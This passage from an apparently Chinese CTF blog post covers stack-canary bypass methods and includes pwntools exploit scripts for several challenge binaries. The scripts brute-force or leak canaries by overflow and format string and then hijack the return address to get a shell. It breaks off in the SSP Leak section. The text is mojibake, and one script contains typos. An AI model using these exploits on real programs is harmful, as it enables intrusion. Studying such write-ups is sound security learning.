<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Canaryè§£å†³å§¿åŠ¿è¢«æŠ˜ç£¨çš„æœ‰ç‚¹éš¾å— æ‰¾ä¸ªæ—¶é—´æ¥æ–©æ€ï¼ˆbushiï¼‰åˆæ˜¯è¢«è™çš„ä¸€å¤©~  æœ‰é—®é¢˜è¯·æŒ‡æ­£~â€è·å–ä¾‹é¢˜è¯·åœ¨è¯„è®ºåŒºç•™è¨€æˆ–ç§ä¿¡æˆ‘â­ ä¸€ã€canaryçˆ†ç ´æ ‡å¿—æç¤ºå°±ç®—forkå‡½æ•°å§ å¤šçº¿ç¨‹å¼€æ”» ã€funcannaryã€‘* ï¼ˆ1ï¼‰å…ˆè¿è¡Œä¸€ä¸‹ pedaé…å¥—checksec                                              æ ¹æ®é¢˜ç›®æç¤ºâ€™have funâ€™å’Œâ€™w">
<meta property="og:type" content="article">
<meta property="og:title" content="Canaryè§£å†³å§¿åŠ¿">
<meta property="og:url" content="https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/index.html">
<meta property="og:site_name" content="å¹»å¢ƒ">
<meta property="og:description" content="Canaryè§£å†³å§¿åŠ¿è¢«æŠ˜ç£¨çš„æœ‰ç‚¹éš¾å— æ‰¾ä¸ªæ—¶é—´æ¥æ–©æ€ï¼ˆbushiï¼‰åˆæ˜¯è¢«è™çš„ä¸€å¤©~  æœ‰é—®é¢˜è¯·æŒ‡æ­£~â€è·å–ä¾‹é¢˜è¯·åœ¨è¯„è®ºåŒºç•™è¨€æˆ–ç§ä¿¡æˆ‘â­ ä¸€ã€canaryçˆ†ç ´æ ‡å¿—æç¤ºå°±ç®—forkå‡½æ•°å§ å¤šçº¿ç¨‹å¼€æ”» ã€funcannaryã€‘* ï¼ˆ1ï¼‰å…ˆè¿è¡Œä¸€ä¸‹ pedaé…å¥—checksec                                              æ ¹æ®é¢˜ç›®æç¤ºâ€™have funâ€™å’Œâ€™w">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230627202644.jpg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002528552.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002620435.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002919532.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154247901.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154947024.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530155540402.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628164526442.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628170950596.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628171033720.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628172653111.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628173716094.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628202654542.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204047171.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204121367.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204702697.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204720325.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628210551449.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628210759817.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628135719174.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628142542077.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628143124351.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628161126662.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/%601%7D0$_NRN19IS]ZZA9EK_PE.jpg">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628224746293.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628215919448.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628220716478.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628220912579.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628102341433.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628105142174.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628110303853.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628111024934.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628115713705.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628134309027.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230628215705.jpg">
<meta property="article:published_time" content="2023-08-31T16:00:00.000Z">
<meta property="article:modified_time" content="2023-09-01T09:36:59.089Z">
<meta property="article:author" content="yub">
<meta property="article:tag" content="pwn,çŸ¥è¯†ç¢ç‰‡">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230627202644.jpg">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Canaryè§£å†³å§¿åŠ¿</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="å¹»å¢ƒ" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="ç›®å½•"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="ç›®å½•"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="é¡¶éƒ¨" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Articles</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/links/">Links</a></li><!--
     --><!--
       --><li><a href="/tags/">Tags</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="ä¸Šä¸€ç¯‡" href="/2023/11/27/NepCTF%202023/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="ä¸‹ä¸€ç¯‡" href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="è¿”å›é¡¶éƒ¨" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="åˆ†äº«æ–‡ç« " href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">ä¸Šä¸€ç¯‡</span>
      <span id="i-next" class="info" style="display:none;">ä¸‹ä¸€ç¯‡</span>
      <span id="i-top" class="info" style="display:none;">è¿”å›é¡¶éƒ¨</span>
      <span id="i-share" class="info" style="display:none;">åˆ†äº«æ–‡ç« </span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&text=Canaryè§£å†³å§¿åŠ¿"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canaryè§£å†³å§¿åŠ¿"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&is_video=false&description=Canaryè§£å†³å§¿åŠ¿"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Canaryè§£å†³å§¿åŠ¿&body=Check out this article: https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canaryè§£å†³å§¿åŠ¿"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canaryè§£å†³å§¿åŠ¿"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canaryè§£å†³å§¿åŠ¿"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canaryè§£å†³å§¿åŠ¿"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&name=Canaryè§£å†³å§¿åŠ¿&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&t=Canaryè§£å†³å§¿åŠ¿"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.</span> <span class="toc-text">Canaryè§£å†³å§¿åŠ¿</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E3%80%81canary%E7%88%86%E7%A0%B4"><span class="toc-number">1.0.1.</span> <span class="toc-text">ä¸€ã€canaryçˆ†ç ´</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%A6%86%E7%9B%96%E6%88%AA%E6%96%AD%E5%AD%97%E7%AC%A6%EF%BC%88-x00%EF%BC%89%E8%8E%B7%E5%8F%96canary"><span class="toc-number">1.0.2.</span> <span class="toc-text">äºŒã€è¦†ç›–æˆªæ–­å­—ç¬¦ï¼ˆ\x00ï¼‰è·å–canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%8E%B7%E5%8F%96canary"><span class="toc-number">1.0.3.</span> <span class="toc-text">ä¸‰ã€åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è·å–canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SSP-Leak%E5%88%A9%E7%94%A8canary"><span class="toc-number">1.0.4.</span> <span class="toc-text">å››ã€SSP Leakåˆ©ç”¨canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%8A%AB%E6%8C%81stack-chk-fail%E5%87%BD%E6%95%B0%E6%B3%84%E9%9C%B2canary"><span class="toc-number">1.0.5.</span> <span class="toc-text">äº”ã€åŠ«æŒstack_chk_failå‡½æ•°æ³„éœ²canary</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E4%BF%AE%E6%94%B9TSL%E7%BB%95%E8%BF%87canary"><span class="toc-number">1.0.6.</span> <span class="toc-text">å…­ã€ä¿®æ”¹TSLç»•è¿‡canary</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Canaryè§£å†³å§¿åŠ¿
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">yub</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-08-31T16:00:00.000Z" class="dt-published" itemprop="datePublished">2023-09-01</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">äºŒè¿›åˆ¶å®‰å…¨</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/pwn-%E7%9F%A5%E8%AF%86%E7%A2%8E%E7%89%87/" rel="tag">pwn,çŸ¥è¯†ç¢ç‰‡</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="Canaryè§£å†³å§¿åŠ¿"><a href="#Canaryè§£å†³å§¿åŠ¿" class="headerlink" title="Canaryè§£å†³å§¿åŠ¿"></a><strong>Canaryè§£å†³å§¿åŠ¿</strong></h2><p>è¢«æŠ˜ç£¨çš„æœ‰ç‚¹éš¾å— æ‰¾ä¸ªæ—¶é—´æ¥æ–©æ€ï¼ˆbushiï¼‰åˆæ˜¯è¢«è™çš„ä¸€å¤©~<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230627202644.jpg"></p>
<hr>
<p><u>æœ‰é—®é¢˜è¯·æŒ‡æ­£~</u>â€<br><u>è·å–ä¾‹é¢˜è¯·åœ¨è¯„è®ºåŒºç•™è¨€æˆ–ç§ä¿¡æˆ‘</u>â­</p>
<h4 id="ä¸€ã€canaryçˆ†ç ´"><a href="#ä¸€ã€canaryçˆ†ç ´" class="headerlink" title="ä¸€ã€canaryçˆ†ç ´"></a><strong>ä¸€ã€canaryçˆ†ç ´</strong></h4><p>æ ‡å¿—æç¤ºå°±ç®—forkå‡½æ•°å§ å¤šçº¿ç¨‹å¼€æ”»</p>
<p><strong>ã€funcannaryã€‘</strong>*</p>
<p>ï¼ˆ1ï¼‰å…ˆè¿è¡Œä¸€ä¸‹ pedaé…å¥—checksec<br>                       <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002528552.png" alt="image-20230530002528552"><br>                       æ ¹æ®é¢˜ç›®æç¤ºâ€™have funâ€™å’Œâ€™welcomeâ€™åœ¨çˆ†ç ´çš„expä¸­ä¼šç”¨ä½œäºè¦†ç›–èŠ‚ç‚¹</p>
<p>â€‹                              â€‹<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002620435.png" alt="image-20230530002620435"> </p>
<p>â€‹         å‘ç°Canaryå’ŒPIEéƒ½å¼€ å‡†å¤‡å¥½çˆ†ç ´ï¼ˆå¦‚æœæœ‰å¯ä»¥åˆ©ç”¨çš„å­—ç¬¦ä¸²canaryä¹Ÿå¯ä»¥ç»•è¿‡ï¼‰<br>â€‹         å¯¹åº”éšæœºåŒ– åç»­åœ¨IDAä¸­åªèƒ½åˆ©ç”¨å…¶åœ°å€è®¡ç®—åç§»</p>
<p>ï¼ˆ2ï¼‰è¿›IDA </p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002919532.png" alt="image-20230530002919532"></p>
<p>forkæ¥å£ &#x3D;&#x3D; canaryçˆ†ç ´ï¼ˆå¤šçº¿ç¨‹ï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154247901.png" alt="image-20230530154247901"></p>
<p>å‘ç°å‡½æ•°å…¥å£ä¸º0x122D å¹¶ä¸”å‘ç°â€&#x2F;bin&#x2F;cat flagâ€ æ¥ä¸‹æ¥æ‰¾æº¢å‡ºä½ç½®çˆ†ç ´cannary</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154947024.png" alt="image-20230530154947024"></p>
<p>æ˜æ˜¾æº¢å‡º å®šä½è¯¥å‡½æ•°sub_128Aï¼ˆçˆ†ç ´canaryçš„ä½ç½®ï¼‰çˆ†ç ´æˆåŠŸåçˆ†è¿”å›åœ°å€ ï¼ˆçˆ†canaryåœ°å€çš„ä¸‹ä¸€ä½ï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530155540402.png" alt="image-20230530155540402"></p>
<p>å‡½æ•°å…¥å£ä¸º0x122D shellè¿”å›åœ°å€ä¸º1329 åç§»ä¸º0xfc(0x1329-0x122D) è¦†ç›–çš„bufå¤§å°ä¸º0x68</p>
<p><strong>tips</strong><br>ã€1ã€‘canaryå¤§å°ä¸º0x00-0xff æ‰€ä»¥çˆ†ç ´æ—¶æ¯å­—èŠ‚éœ€å¾ªç¯257æ¬¡ åˆå› ä¸ºcanaryä½ä¸‰ä½å®šä¸º\x00ï¼ˆ32ä½çˆ†ç ´å¾ªç¯3æ¬¡ 64ä½å¾ªç¯7æ¬¡ï¼‰æ­¤å¤„éœ€å¾ªç¯7æ¬¡<br>ã€2ã€‘ç¨‹åºå…¥å£ç‚¹ä¸€èˆ¬éƒ½æ˜¯æ•´æ•°ï¼Œå³åœ°å€æœ€ä½ä½ä¸º00ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„åœ°å€ï¼Œ0x29æ˜¯å¯ä¿¡çš„ã€‚å°±åªè¦çˆ†ç ´åä¸€ä½å°±OKï¼Œå†åé¢çš„åœ°å€éƒ½ç›¸åŒï¼Œçˆ†ä¸çˆ†éƒ½ä¸€æ ·ã€‚</p>
<p>expï¼š</p>
<pre><code class="python">from pwn import *   
context.arch = &#39;amd64&#39;
context.os = &#39;linux&#39;
context.log_level = &#39;debug&#39;

p = process(&quot;./fun&quot;)
#p = remote(&quot;39.106.65.236&quot;, &quot;30687&quot;)
p.recvuntil(b&#39;welcome\n&#39;) 
canary = b&#39;\x00&#39;
#canary
for k in range(7):
  info(f&#39;No:&#123;K+1&#125;start,finding...&#39;)
  for i in range(256):
     p.send(b&#39;a&#39;*(0x70-8)+cannary+btyes([i]))
     recv = p.recvuntil(b&#39;welcome\n&#39;)
     if b&quot;have fun&quot; in recv:
      cannary += bytes([i])
      success(f&quot;canary =&gt; &#123;canary.hex()&#125;&quot;)
      break
      
#return address
re_1 = 0x29
re_2 = 0
info(&#39;finding:re_2 ...&#39;)
for re_i in range(0x100):
  payload = b&#39;a&#39; * 0x68 + canary + b&#39;A&#39; * 8 + p8(re_1) + p8(re_i)
#p8()å°†ç»™å®šçš„æ•´æ•°è½¬æ¢ä¸ºå•å­—èŠ‚çš„å­—èŠ‚ä¸²
  p.send(payload)
  recv = p.recvuntil(b&quot;welcome\n&quot;)
  if b&quot;have fun&quot; in recv:
       re_2 = re_i
       success(f&quot;re_2 =&gt; &#123;hex(re_2)&#125;&quot;)
       break
payload = b&#39;a&#39; * (0x70-8) + canary + b&#39;A&#39; * 8 + p8(re_1 - 1) + p8(re_2 - 1)#-1å¯¹é½æ ˆ
p.send(payload)
p.interactive()
</code></pre>
<h4 id="äºŒã€è¦†ç›–æˆªæ–­å­—ç¬¦ï¼ˆ-x00ï¼‰è·å–canary"><a href="#äºŒã€è¦†ç›–æˆªæ–­å­—ç¬¦ï¼ˆ-x00ï¼‰è·å–canary" class="headerlink" title="äºŒã€è¦†ç›–æˆªæ–­å­—ç¬¦ï¼ˆ\x00ï¼‰è·å–canary"></a>äºŒã€è¦†ç›–æˆªæ–­å­—ç¬¦ï¼ˆ\x00ï¼‰è·å–canary</h4><p>æ€è·¯ï¼š<br>$æ„é€ ç¬¬ä¸€æ¬¡æº¢å‡ºï¼Œè¦†ç›–canaryçš„ä½å­—èŠ‚\x00ï¼Œè¯»å‡ºcanaryçš„å€¼.<br>$æ„é€ ç¬¬äºŒæ¬¡æº¢å‡ºï¼Œåˆ©ç”¨è·å–çš„canaryæ„é€ payloadï¼Œget shell.<br>ã€babypieã€‘<br>ï¼ˆ1ï¼‰checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628164526442.png" alt="image-20230628164526442"></p>
<p>ï¼ˆ2ï¼‰IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628170950596.png" alt="image-20230628170950596"></p>
<p>  ä¸¤æ¬¡readæº¢å‡º</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628171033720.png" alt="image-20230628171033720"></p>
<p>NXæ‰“å¼€æœ‰å¯åˆ©ç”¨çš„systemï¼ˆâ€&#x2F;bin&#x2F;shâ€ï¼‰<br>PIEæ‰“å¼€åä½åœ°å€å§‹ç»ˆä¸å˜ï¼Œå¯ä»¥ç¢°è¿æ°”ï¼ˆbuhsi(â—â€™â—¡â€™â—)ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628172653111.png" alt="image-20230628172653111"></p>
<p>canaryä»¥\x00ç»“å°¾ï¼ˆä¸ºé˜²æ­¢è¢«è¯»å‡ºï¼‰é‚£æˆ‘ä»¬å°±æº¢å‡ºè¦†ç›–\x00å†é€šè¿‡printå‡½æ•°æ‰“å°å‡ºcanary<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628173716094.png" alt="image-20230628173716094"></p>
<p>0x30-0x8 &#x3D; 40ï¼Œå†+1è¦†ç›–\x00<br>expï¼š</p>
<pre><code class="python">from pwn import*
#sh = process(&#39;./babypie&#39;)
sh = remote(&#39;node4.buuoj.cn&#39;,29536)
payload = b&#39;a&#39; * 0x29

#å…ˆæ•´canary
sh.sendafter(b&#39;Input your Name:\n&#39;,payload)
sh.recv(6 + 40)#è¯»å–6ä¸ªå­—èŠ‚ï¼ˆå³ç¨‹åºçš„å›åº”æ¶ˆæ¯ï¼‰å’Œ40ä¸ªå­—èŠ‚ï¼ˆå³ç¨‹åºè¿”å›çš„canaryå€¼ï¼‰
canary = u64(sh.recv(8)) &amp; (0xffffffffffffff00)#æœ«å°¾æ¸…0ä»¥ä¿æŒä¸ç¨‹åºå†…éƒ¨çš„å­—èŠ‚å¯¹é½
log.success(&#39;canary:%x \n&#39;,canary)
payload = b&#39;a&#39; * 40 + p64(canary)  + p64(0)+ b&#39;\x42&#39;
#p64(0)å°†æ ˆä¸Šçš„è¿”å›åœ°å€æ›¿æ¢ä¸º0ï¼Œä»è€Œç»•è¿‡å†…å­˜ä¿æŠ¤æœºåˆ¶
sh.send(payload)
sh.interactive()
</code></pre>
<h4 id="ä¸‰ã€åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è·å–canary"><a href="#ä¸‰ã€åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è·å–canary" class="headerlink" title="ä¸‰ã€åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è·å–canary"></a><strong>ä¸‰ã€åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è·å–canary</strong></h4><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å¯ä»¥æ‰“å°å‡ºæ ˆä¸­å†…å®¹ï¼Œç›®æ ‡åˆ©ç”¨æ­¤æ¼æ´æ‰“å°å‡ºcanaryå€¼ï¼Œå†åˆ©ç”¨æº¢å‡ºè¿›è¡Œæ”»å‡».<br>ã€Mary_Mortonã€‘<br>ï¼ˆ1ï¼‰checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628202654542.png" alt="image-20230628202654542"></p>
<p>ï¼ˆ2ï¼‰IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204047171.png" alt="image-20230628204047171"></p>
<p>å¿«ä¹<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204121367.png" alt="image-20230628204121367"></p>
<p> è®¡ç®—åç§»å–½<br>                                      <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204702697.png" alt="image-20230628204702697"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628204720325.png" alt="image-20230628204720325"></p>
<p>bufä¸canaryè·ç¦» 0x90 - 0x8 &#x3D; 0x88(136)   2^8+1 &#x3D; 17ä¸ªå†…å­˜å•å…ƒ<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628210551449.png" alt="image-20230628210551449"></p>
<p>canaryä¸printfæ ¼å¼åŒ–å­—ç¬¦ä¸²å½¢å‚ç›¸å¯¹åç§»ä¸º17+6 &#x3D; 23<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628210759817.png" alt="image-20230628210759817"></p>
<p>expï¼š</p>
<pre><code class="python">from pwn import*
context(os=&#39;linux&#39;, arch=&#39;amd64&#39;, log_level=&#39;debug&#39;)
 
#p=process(&#39;./mary&#39;)
p=remote(&quot;61.147.171.105&quot;,63174)
 
p.sendlineafter(&quot;battle \n&quot;,&quot;2&quot;)
p.sendline(&quot;%23$p&quot;)
tmp=int(p.recv(),16)
canary=p64(tmp)
 
payload=b&quot;a&quot;*(0x88)+canary+p64(0)+p64(0x4008DA)
 
p.sendlineafter(&quot;3.&quot;,&quot;1&quot;)
 
p.sendline(payload)
p.interactive()
</code></pre>
<h4 id="å››ã€SSP-Leakåˆ©ç”¨canary"><a href="#å››ã€SSP-Leakåˆ©ç”¨canary" class="headerlink" title="å››ã€SSP Leakåˆ©ç”¨canary"></a><strong>å››ã€SSP Leakåˆ©ç”¨canary</strong></h4><p>æ€è·¯ï¼š<br>$canaryæ£€æµ‹å¤±è´¥ä¼šè§¦å‘stack_chk_faliå‡½æ•°é€ æˆstack smashingï¼ˆstack smashing protect leakï¼‰<br>$stack_chk_failå‡½æ•°ä¼šè¾“å‡ºä¸€æ®µæŠ¥é”™æ˜¾ç¤ºæ–‡ä»¶åï¼Œè¦†ç›–æ–‡ä»¶åæŒ‡é’ˆï¼Œä»è€Œå®ç°ä»»æ„è¯»ä¹Ÿå°±æ˜¯è¦†ç›–å˜é‡__libc_argv[0]<br>$åˆ©ç”¨ç›¸åº”å‡½æ•°è¿›è¡Œæº¢å‡ºï¼ˆputsã€readã€writeï¼‰å¾—åˆ°libcbase å¾—å‡ºå…³é”®åœ°å€è¿›è¡Œæ”»å‡»</p>
<pre><code class="c">void __attribute__ ((noreturn)) __stack_chk_fail (void)
&#123;
  __fortify_fail (&quot;stack smashing detected&quot;);
&#125;

